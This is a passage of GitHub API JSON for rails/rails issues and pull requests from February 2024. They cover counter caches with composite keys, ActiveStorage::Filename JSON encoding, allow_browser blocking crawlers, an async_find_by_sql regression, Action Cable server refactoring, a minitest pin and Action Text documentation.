        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50983/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50983/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50983/events",
        "html_url": "https://github.com/rails/rails/pull/50983",
        "id": 2120798794,
        "node_id": "PR_kwDNIULOZiTyjQ",
        "number": 50983,
        "title": "Fix counter caches to work for models with composite primary keys",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-06T13:35:09Z",
        "updated_at": "2024-02-09T10:50:32Z",
        "closed_at": "2024-02-09T07:16:51Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50983",
            "html_url": "https://github.com/rails/rails/pull/50983",
            "diff_url": "https://github.com/rails/rails/pull/50983.diff",
            "patch_url": "https://github.com/rails/rails/pull/50983.patch",
            "merged_at": "2024-02-09T07:16:51Z"
        },
        "body": "Fixes #50968.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50983/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50983/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50982",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50982/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50982/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50982/events",
        "html_url": "https://github.com/rails/rails/pull/50982",
        "id": 2120678809,
        "node_id": "PR_kwDNIULOZiNJhA",
        "number": 50982,
        "title": "Fix JSON-encoding ActiveStorage::Filename",
        "user": {
            "login": "jdelStrother",
            "id": 2377,
            "node_id": "MDQ6VXNlcjIzNzc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2377?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jdelStrother",
            "html_url": "https://github.com/jdelStrother",
            "followers_url": "https://api.github.com/users/jdelStrother/followers",
            "following_url": "https://api.github.com/users/jdelStrother/following{/other_user}",
            "gists_url": "https://api.github.com/users/jdelStrother/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jdelStrother/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jdelStrother/subscriptions",
            "organizations_url": "https://api.github.com/users/jdelStrother/orgs",
            "repos_url": "https://api.github.com/users/jdelStrother/repos",
            "events_url": "https://api.github.com/users/jdelStrother/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jdelStrother/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-06T12:36:06Z",
        "updated_at": "2024-02-06T15:43:10Z",
        "closed_at": "2024-02-06T15:43:10Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50982",
            "html_url": "https://github.com/rails/rails/pull/50982",
            "diff_url": "https://github.com/rails/rails/pull/50982.diff",
            "patch_url": "https://github.com/rails/rails/pull/50982.patch",
            "merged_at": "2024-02-06T15:43:10Z"
        },
        "body": "### Motivation / Background\r\n\r\nActiveStorage::Filename was missing quotes when encoded, generating invalid json like this -\r\n\r\n```ruby\r\nJSON.generate(foo: ActiveStorage::Filename.new(\"bar.pdf\") # => '{\"foo\":bar.pdf}'\r\n```\r\n\r\n### Detail\r\n\r\nDelete `to_json` and rely on the implementation from ActiveSupport::ToJsonWithActiveSupportEncoder\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50982/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50982/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50981",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50981/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50981/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50981/events",
        "html_url": "https://github.com/rails/rails/issues/50981",
        "id": 2120588332,
        "node_id": "I_kwDNIULOfmWcLA",
        "number": 50981,
        "title": "allow_browser may prevent your site from being crawled",
        "user": {
            "login": "nickjj",
            "id": 813219,
            "node_id": "MDQ6VXNlcjgxMzIxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/813219?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nickjj",
            "html_url": "https://github.com/nickjj",
            "followers_url": "https://api.github.com/users/nickjj/followers",
            "following_url": "https://api.github.com/users/nickjj/following{/other_user}",
            "gists_url": "https://api.github.com/users/nickjj/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nickjj/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nickjj/subscriptions",
            "organizations_url": "https://api.github.com/users/nickjj/orgs",
            "repos_url": "https://api.github.com/users/nickjj/repos",
            "events_url": "https://api.github.com/users/nickjj/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nickjj/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-06T11:48:14Z",
        "updated_at": "2024-02-10T13:39:44Z",
        "closed_at": "2024-02-10T01:36:04Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "https://github.com/rails/rails/pull/50505 was merged a few weeks ago which blocks user agents that don't match a specific set of browser versions. Based on the PR it looks like this is the default since it's included in the generator's output.\r\n\r\nThis runs the risk of preventing your site from being crawled by various search engines. Google has a [number of specific crawlers](https://developers.google.com/search/docs/crawling-indexing/overview-google-crawlers) that won't match the agents supplied in that PR (images, videos, etc.).\r\n\r\nIt will also prevent anyone from accessing your site with `curl` or other popular HTTP clients unless they manually define an agent that mimics a modern browser. This could be an undesired effect as a default, especially without documentation stating that.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50981/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50981/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50980",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50980/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50980/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50980/events",
        "html_url": "https://github.com/rails/rails/issues/50980",
        "id": 2119848918,
        "node_id": "I_kwDNIULOflpT1g",
        "number": 50980,
        "title": "[Rails 7.1.3] async_find_by_sql needs promise.value.value ?!",
        "user": {
            "login": "OskarEichler",
            "id": 62393985,
            "node_id": "MDQ6VXNlcjYyMzkzOTg1",
            "avatar_url": "https://avatars.githubusercontent.com/u/62393985?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/OskarEichler",
            "html_url": "https://github.com/OskarEichler",
            "followers_url": "https://api.github.com/users/OskarEichler/followers",
            "following_url": "https://api.github.com/users/OskarEichler/following{/other_user}",
            "gists_url": "https://api.github.com/users/OskarEichler/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/OskarEichler/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/OskarEichler/subscriptions",
            "organizations_url": "https://api.github.com/users/OskarEichler/orgs",
            "repos_url": "https://api.github.com/users/OskarEichler/repos",
            "events_url": "https://api.github.com/users/OskarEichler/events{/privacy}",
            "received_events_url": "https://api.github.com/users/OskarEichler/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-06T03:06:50Z",
        "updated_at": "2024-02-06T04:24:40Z",
        "closed_at": "2024-02-06T04:24:02Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nWhen calling async_find_by_sql since upgrading from Rails 7.1.2 to Rails 7.1.3 the promise no longer returns it's result when calling .value, but instead we need to call .value twice, in order to actually get the values.\r\n\r\n### Expected behavior\r\npromise.value should return the result.\r\n\r\n### Actual behavior\r\nSince Rails 7.1.3 need to call promise.value.value instead.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.2.1\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50980/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50980/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50979",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50979/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50979/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50979/events",
        "html_url": "https://github.com/rails/rails/pull/50979",
        "id": 2119798489,
        "node_id": "PR_kwDNIULOZhdElA",
        "number": 50979,
        "title": "Action Cable server adapterization",
        "user": {
            "login": "palkan",
            "id": 1516722,
            "node_id": "MDQ6VXNlcjE1MTY3MjI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1516722?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/palkan",
            "html_url": "https://github.com/palkan",
            "followers_url": "https://api.github.com/users/palkan/followers",
            "following_url": "https://api.github.com/users/palkan/following{/other_user}",
            "gists_url": "https://api.github.com/users/palkan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/palkan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/palkan/subscriptions",
            "organizations_url": "https://api.github.com/users/palkan/orgs",
            "repos_url": "https://api.github.com/users/palkan/repos",
            "events_url": "https://api.github.com/users/palkan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/palkan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 7,
        "created_at": "2024-02-06T02:13:01Z",
        "updated_at": "2024-02-12T16:56:51Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50979",
            "html_url": "https://github.com/rails/rails/pull/50979",
            "diff_url": "https://github.com/rails/rails/pull/50979.diff",
            "patch_url": "https://github.com/rails/rails/pull/50979.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis PR aims to make Action Cable more flexible and extensible as a library/framework by separating low-level, implementation specific details (e.g., handling WebSockets, dealing with concurrency) from abstractions (Connection, Channel classes). That would make it possible to use user-level Action Cable code with alternative web servers or execution models (e.g., Fibers) without rewriting it or monkey-patching internals.\r\n\r\n> [!TIP]\r\n> You can find a more detailed description of the problem, motivation and potential benefits of such refactoring in [this document](https://docs.google.com/document/d/1oGf86NAzQL9sDw6rTfUNSe3mzzg7wX64sc34D-_3EDI/edit#heading=h.d3db1fd03ano).\r\n\r\n> [!NOTE] \r\n> This PR does not introduce any new features or public API breaking changes. It doesn't affect the existing functionality of built-in Action Cable server.\r\n\r\n### Detail\r\n\r\nThe changes are grouped into commits to reflect the following major changes.\r\n\r\n1) **Reorganizing threaded executors**. \r\n\r\nAction Cable relies on two threaded executors right now: one to perform user-space code (Worker) and another one to perform internal async operations around pub/sub. The latter was for some (historical?) reason hidden within the `StreamEventLoop` class that implements and IO loop to perform read/write operations on sockets. I've extracted the executor and promoted it into a server attribute independent of IO event loop. The main motivation of this extraction is not only in enforcing SoC but to separate WebSocket-specific code from more generic async executor used throughout the codebase.\r\n\r\nI've also wrapped the Concurrent Ruby threaded executor into a custom class with a minimal interface (`#post`, `#timer` and `#shutdown` methods), so it will be possible to configure a custom executor for a server in the future (one use-case we have in mind is using a Fiber-based executor instead of a Thread-based one).\r\n\r\nNote that this PR doesn't include any configuration-related code (e.g., to support smth like `config.action_cable.async_executor = :fiber`) but I'm considering adding something like that in the follow-up PRs.\r\n\r\n2) **Limiting the scope of async operations**.\r\n\r\nThis step is the follow-up to the async executor extraction. We have a few places in the Channel internals which directly refer to the `event_loop` but they're all related to pub/sub operations. So, to avoid unnecessary async operations at the abstraction level, I moved all it to the pub/sub layer by and standardized it across adapters by using a `SubscriberMap::Async` subclass.\r\n\r\nPreviously, we might have double async calls when performing `#stream_from` (one from the channel and one from the pub/sub adapter); now it's up to the adapter whether to create subscriptions asynchronously or not. We shouldn't duplicate this logic.\r\n\r\n3) **Splitting ActionCable::Connection::Base into ActionCable::Connection::Base and ActionCable::Server::Connection**\r\n\r\nToday, the Connection class knows about everything from performing user code to setting up WebSocket event listeners to dealing with Rails executor wrapping. That prevents from reusing this class in environments when we don't need to deal with all of these (non-WebSocket servers or unit tests, more about them below).\r\n\r\nThis change is mostly code reorganization and minor tests updates (e.g., we no longer need to always use `run_in_eventmachine`, because now we deal with pure Ruby classes).\r\n\r\nSo, now we have two types of connections: low-level Server::Connection and application-level Connection::Base. The _communicate_ with each other via the following interfaces:\r\n\r\n```mermaid\r\nclassDiagram\r\n  class _PubSub {\r\n    subscribe: (channel, handler, callback) -> void\r\n    unsubscribe: (channel, handler) -> void\r\n  }\r\n  \r\n  class _Executor {\r\n    post: (&block) -> void\r\n    timer: (interval, &block) -> handle\r\n  }\r\n  \r\n  class _Server {\r\n    pubsub: _PubSub\r\n    executor: _Executor\r\n    config: Configuration \r\n  }\r\n  \r\n  class _ServerConn {\r\n    logger: Logger\r\n    env: Hash[String, untyped]\r\n    request: Request\r\n    protocol: String\r\n    initialize: (_Server, env) -> void\r\n    transmit: (untyped) -> void\r\n    close: () -> void\r\n    perform_work: (untyped receiver, method_name Symbol, *untyped args) -> void\r\n  }\r\n  \r\n  class _Connection {\r\n    initialize: (_Server, _ServerConn) -> void\r\n    handle_open: () -> void\r\n    handle_incoming: (payload) -> void\r\n    handle_close: () -> void\r\n    beat: () -> void\r\n    statistics: () -> Hash[Symbol, untyped]\r\n  }\r\n  \r\n  _Server --> _PubSub\r\n  _Server --> _Executor\r\n  _Connection --> _ServerConn\r\n  _Connection --> _Server\r\n```\r\n\r\n### Examples / follow-ups\r\n\r\n#### Action Cable testing\r\n\r\nHere is an example commit (one of the future PRs) demonstrating how this refactoring simplifies Action Cable testing and make it more robust (no patches, real connection and channel classes, etc.): https://github.com/palkan/rails/commit/3ba6d35c788134faeb062b12f371aab5da1886b8\r\n\r\n#### Action Cable over SSE\r\n\r\nHere is a sketch of how SSE transport for Action Cable can be implemented (based on the changes from this PR): https://gist.github.com/palkan/270a192e79b05d5601fe497ad3ec83b5\r\n\r\n### Additional information\r\n\r\nHere is a [Discord thread](https://discord.com/channels/849034466856665118/1168026423001366609) where we discuss the project.\r\n\r\nThere is an old PR attempting to achieve the same goal: https://github.com/rails/rails/pull/27648.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\n/cc @ioquatix @matthewd @rafaelfranca ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50979/reactions",
            "total_count": 4,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 4,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50979/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50978",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50978/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50978/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50978/events",
        "html_url": "https://github.com/rails/rails/pull/50978",
        "id": 2119751080,
        "node_id": "PR_kwDNIULOZhakBw",
        "number": 50978,
        "title": "Pin minitest version to 5.21",
        "user": {
            "login": "yahonda",
            "id": 73684,
            "node_id": "MDQ6VXNlcjczNjg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/73684?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yahonda",
            "html_url": "https://github.com/yahonda",
            "followers_url": "https://api.github.com/users/yahonda/followers",
            "following_url": "https://api.github.com/users/yahonda/following{/other_user}",
            "gists_url": "https://api.github.com/users/yahonda/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yahonda/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yahonda/subscriptions",
            "organizations_url": "https://api.github.com/users/yahonda/orgs",
            "repos_url": "https://api.github.com/users/yahonda/repos",
            "events_url": "https://api.github.com/users/yahonda/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yahonda/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-02-06T01:15:48Z",
        "updated_at": "2024-02-13T22:44:23Z",
        "closed_at": "2024-02-06T02:05:00Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50978",
            "html_url": "https://github.com/rails/rails/pull/50978",
            "diff_url": "https://github.com/rails/rails/pull/50978.diff",
            "patch_url": "https://github.com/rails/rails/pull/50978.patch",
            "merged_at": "2024-02-06T02:05:00Z"
        },
        "body": "### Motivation / Background\r\n\r\nManaged to reproduce CI failure at https://buildkite.com/rails/rails-nightly/builds/133#018d7bb8-8a32-4978-8e36-d7cb9b067813/1196-1204 . It would also reproduce against the released versions of Ruby because this is triggered by minitest v5.22.0 change. https://github.com/minitest/minitest/commit/ebb468c81c0eea069234127bd6a101c84e955872\r\n\r\nTo avoid all of railties CI failures, pin minitest version to 5.21 tentatively.\r\n\r\n### Detail\r\n* Steps to reproduce\r\n```ruby\r\ngit clone https://github.com/rails/rails\r\ncd rails\r\nrm Gemfile.lock\r\nbundle install\r\ncd railties\r\nbin/test test/application/test_runner_test.rb -n test_system_tests_are_not_run_with_the_default_test_command\r\n```\r\n* Expected behavior\r\nIt should pass.\r\n\r\n* Actual behavior\r\n```ruby\r\n$ bin/test test/application/test_runner_test.rb -n test_system_tests_are_not_run_with_the_default_test_command\r\nRun options: -n test_system_tests_are_not_run_with_the_default_test_command --seed 14574\r\n\r\nF\r\n\r\nFailure:\r\nApplicationTests::TestRunnerTest#test_system_tests_are_not_run_with_the_default_test_command [test/application/test_runner_test.rb:1191]:\r\nExpected /0\\ runs,\\ 0\\ assertions,\\ 0\\ failures,\\ 0\\ errors,\\ 0\\ skips/ to match \"Nothing ran for filter: \\nRunning 0 tests in a single process (parallelization threshold is 50)\\nRun options: --seed 45713\\n\\n# Running:\\n\\n\".\r\n\r\nbin/test test/application/test_runner_test.rb:1179\r\n\r\nFinished in 9.982314s, 0.1002 runs/s, 0.2004 assertions/s.\r\n1 runs, 2 assertions, 1 failures, 0 errors, 0 skips\r\n$\r\n```\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\n\r\n\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50978/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50978/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50977",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50977/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50977/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50977/events",
        "html_url": "https://github.com/rails/rails/pull/50977",
        "id": 2119534759,
        "node_id": "PR_kwDNIULOZhOnvA",
        "number": 50977,
        "title": "[RF DOCS] Action Text Documention [ci-skip] ",
        "user": {
            "login": "Ridhwana",
            "id": 2786819,
            "node_id": "MDQ6VXNlcjI3ODY4MTk=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2786819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Ridhwana",
            "html_url": "https://github.com/Ridhwana",
            "followers_url": "https://api.github.com/users/Ridhwana/followers",
            "following_url": "https://api.github.com/users/Ridhwana/following{/other_user}",
            "gists_url": "https://api.github.com/users/Ridhwana/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Ridhwana/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Ridhwana/subscriptions",
            "organizations_url": "https://api.github.com/users/Ridhwana/orgs",
            "repos_url": "https://api.github.com/users/Ridhwana/repos",
            "events_url": "https://api.github.com/users/Ridhwana/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Ridhwana/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            },
            {
                "id": 6434393529,
                "node_id": "LA_kwDNIULPAAAAAX-FDbk",
                "url": "https://api.github.com/repos/rails/rails/labels/rails%20foundation",
                "name": "rails foundation",
                "color": "e99695",
                "default": false,
                "description": "Rails Foundation PRs"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-05T22:02:36Z",
        "updated_at": "2024-02-14T18:07:36Z",
        "closed_at": "2024-02-14T18:07:36Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50977",
            "html_url": "https://github.com/rails/rails/pull/50977",
            "diff_url": "https://github.com/rails/rails/pull/50977.diff",
            "patch_url": "https://github.com/rails/rails/pull/50977.patch",
            "merged_at": "2024-02-14T18:07:36Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\nThe Action Text documentation benefits from some more examples and explanations of some of the concepts that are mentioned, as well as the introduction of some new ones. \r\n\r\n### Detail\r\n\r\nThis Pull Request updates the documentation for Action Text. It adds, reorders and in general creates clear instructions for using Action Text.\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50977/reactions",
            "total_count": 5,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 5,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50977/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50976",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50976/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50976/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50976/events",
        "html_url": "https://github.com/rails/rails/issues/50976",
        "id": 2119534595,
        "node_id": "I_kwDNIULOflWIAw",
        "number": 50976,
        "title": "ActiveSupport::TimeZone.new raises ArgumentError",
        "user": {
            "login": "dan-jensen",
            "id": 3031162,
            "node_id": "MDQ6VXNlcjMwMzExNjI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3031162?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dan-jensen",
            "html_url": "https://github.com/dan-jensen",
            "followers_url": "https://api.github.com/users/dan-jensen/followers",
            "following_url": "https://api.github.com/users/dan-jensen/following{/other_user}",
            "gists_url": "https://api.github.com/users/dan-jensen/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dan-jensen/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dan-jensen/subscriptions",
            "organizations_url": "https://api.github.com/users/dan-jensen/orgs",
            "repos_url": "https://api.github.com/users/dan-jensen/repos",
            "events_url": "https://api.github.com/users/dan-jensen/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dan-jensen/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-02-05T22:02:31Z",
        "updated_at": "2024-02-10T07:12:37Z",
